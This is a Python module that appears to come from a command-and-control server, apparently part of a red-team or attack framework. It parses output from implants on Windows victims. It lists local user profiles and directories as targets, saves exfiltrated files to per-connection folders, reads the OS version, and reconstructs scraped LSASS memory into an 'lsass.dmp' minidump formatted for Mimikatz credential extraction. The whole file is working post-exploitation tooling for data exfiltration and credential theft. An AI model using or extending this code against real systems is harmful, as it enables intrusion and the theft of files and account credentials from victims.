import os
from c2.c2_server import read_c2_log, ConnectionStorage
from c2.c2_facts import FactsStorage
import c2.makeminidump


def null_parser(conn_uuid, cmd_indexes_list):
    return []


def local_users_parser(conn_uuid, cmd_indexes_list):
    index = cmd_indexes_list[0]
    data = read_c2_log(conn_uuid, index).split('\n')[1:]
    not_local_users = ['directory opened, sending files', '.', '..', 'All Users', 'Default',
                       'Default User', 'desktop.ini', 'Public', 'directory listing finished', '',
                       'error with specified directory', 'error while querying opened dir']
    local_users = []
    for line in data:
        line = line.replace('\x00', '')
        if line not in not_local_users:
            local_users.append(line)
    if len(local_users) == 0:
        return [('local_users', local_users)]
    else:
        # a default target local user, can be overwritten
        return [('local_users', local_users),
                ('target_local_user', local_users[0])]


def generic_dir_parser(conn_uuid, cmd_indexes_list):
    index = cmd_indexes_list[0]
    data = read_c2_log(conn_uuid, index).split('\n')
    base_dir = data[0].split(" ")[1].strip()
    data = data[1:]
    not_target = ['directory opened, sending files', '.', '..', 'directory listing finished', '',
                  'desktop.ini', 'error with specified directory', 'error while querying opened dir']
    target = []
    for line in data:
        line = line.replace('\x00', '')
        if line not in not_target:
            target.append(base_dir + line)
    if len(target) == 0:
        return [('staged_files', target)]
    else:
        # a default target file, can be overwritten
        return [('staged_files', target),
                ('target_file', target[0])]


def generic_file_parser(conn_uuid, cmd_indexes_list):
    exfiltrated_files = []
    for index in cmd_indexes_list:
        data = read_c2_log(conn_uuid, index, decode=False).split(b'\n')
        cmd, file_data = data[0], b"\n".join(data[1:])
        cmd = cmd.decode()
        full_path = cmd.split(" ")[1]
        exfil_filename = full_path.replace("\\", "_")
        exfiltrated_files.append(exfil_filename)
        with open(os.path.join('/usr/src/app/c2/connections', conn_uuid, exfil_filename), 'wb') as f:
            f.write(file_data)
    return [('exfiltrated_files', exfiltrated_files)]


def version_parser(conn_uuid, cmd_indexes_list):
    index = cmd_indexes_list[0]
    data = read_c2_log(conn_uuid, index, decode=False)
    data = data[-276:]
    dwMajorVersion = int.from_bytes(data[4:7], byteorder='little')
    dwMinorVersion = int.from_bytes(data[8:11], byteorder='little')
    dwBuildNumber = int.from_bytes(data[12:15], byteorder='little')
    return [
        ('major_version', dwMajorVersion),
        ('minor_version', dwMinorVersion),
        ('build_number', dwBuildNumber)
    ]


def process_dump_parser_to_minidump(conn_uuid, cmd_indexes_list):
    # note: this parser requires major_version, minor_version and build_number as facts
    index = cmd_indexes_list[0]
    data = read_c2_log(conn_uuid, index, decode=False)
    data = b'\n'.join(data.split(b'\n')[2:])
    connectionStorage = ConnectionStorage()
    facts = FactsStorage(connectionStorage, conn_uuid)
    dwMajorVersion, dwMinorVersion, dwBuildNumber = \
        facts.getFact('major_version'), facts.getFact('minor_version'), facts.getFact('build_number')
    regions, modules = [], []
    while len(data) > 0:
        header, data = data[:16], data[16:]
        scrape_type = int.from_bytes(header[0:3], byteorder='little')
        size = int.from_bytes(header[4:7], byteorder='little')
        region = int.from_bytes(header[8:15], byteorder='little')
        if scrape_type == 1:
            reg_data, data = data[:size], data[size:]
            regions.append((region, reg_data))
        elif scrape_type == 0:
            module_data, data = data[:100], data[100:]
            module_data = b"\\\x00" + module_data   # Mimikatz wcsrchr
            modules.append((region, size, module_data))
    c2.makeminidump.makeminidump(
        os.path.join('/usr/src/app/c2/connections', conn_uuid, "lsass.dmp"),
        dwMajorVersion,
        dwMinorVersion,
        dwBuildNumber,
        regions,
        modules
    )
    return []
